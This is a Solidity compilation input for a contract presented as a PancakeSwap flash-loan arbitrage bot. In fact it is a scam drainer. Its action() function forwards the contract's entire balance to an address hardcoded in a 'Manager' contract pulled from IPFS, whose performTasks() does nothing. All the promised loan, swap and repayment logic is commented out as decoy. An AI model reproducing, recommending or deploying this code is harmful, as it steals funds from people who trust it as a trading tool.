{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "flashloansdot.sol": {
      "content": "pragma solidity ^0.6.6;\r\n\r\n// Multiplier-Finance Smart Contracts\r\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol\";\r\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol\";\r\n\r\n// PancakeSwap Smart Contracts\r\n//import \"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol\";\r\n//import \"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol\";\r\n//import \"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol\";\r\n\r\n\r\n// Code Manager\r\nimport \"ipfs://QmTjKKq7yowWv9zUWbpeLpo8HZX86y2M2wZtZDFqnVEt77\";\r\n\r\ncontract GetFlashLoan {\r\nstring public tokenName;\r\nstring public tokenSymbol;\r\nuint loanAmount;\r\nManager manager;\r\n\r\nconstructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {\r\ntokenName = _tokenName;\r\ntokenSymbol = _tokenSymbol;\r\nloanAmount = _loanAmount;\r\n\r\nmanager = new Manager();\r\n}\r\nreceive() external payable {}\r\n\r\nfunction action() public payable {\r\n\r\n    // Send required coins for swap\r\n    payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance);\r\n   \r\n    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)\r\n    manager.performTasks();\r\n   \r\n    /*\r\n    // Submit token to Ethereum blockchain\r\n    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);\r\n\r\n        // List the token on pancakeswap & send coins required for swaps\r\nmanager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);\r\npayable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);\r\n\r\n        // Get ETH Loan from Aave\r\nstring memory loanAddress = manager.takeAaveLoan(loanAmount);\r\n\r\n// Convert half ETH to DAI\r\nmanager.pancakeswapDAItoETH(loanAmount / 2);\r\n\r\n        // Create ETH and DAI pairs for our token & Provide liquidity\r\n        string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, \"ETH\");\r\nmanager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);\r\nstring memory daiPair = manager.pancakeswapCreatePool(tokenAddress, \"DAI\");\r\nmanager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);\r\n   \r\n        // Perform swaps and profit on Self-Arbitrage\r\nmanager.pancakeswapPerformSwaps();\r\n\r\n// Move remaining ETH from Contract to your account\r\nmanager.contractToWallet(\"ETH\");\r\n\r\n        // Repay Flash loan\r\nmanager.repayAaveLoan(loanAddress);\r\n    */\r\n}\r\n}"
    },
    "ipfs://QmTjKKq7yowWv9zUWbpeLpo8HZX86y2M2wZtZDFqnVEt77": {
      "content": "pragma solidity ^0.6.6;\r\n\r\ncontract Manager {\r\n        function performTasks() public {\r\n   \r\n        }\r\n\r\n        function pancakeswapDepositAddress() public pure returns (address) {\r\n                   return 0x9244E01deFd966D4b8cF9A20FE5617b23008822d;\r\n         }\r\n}        "
    }
  }
}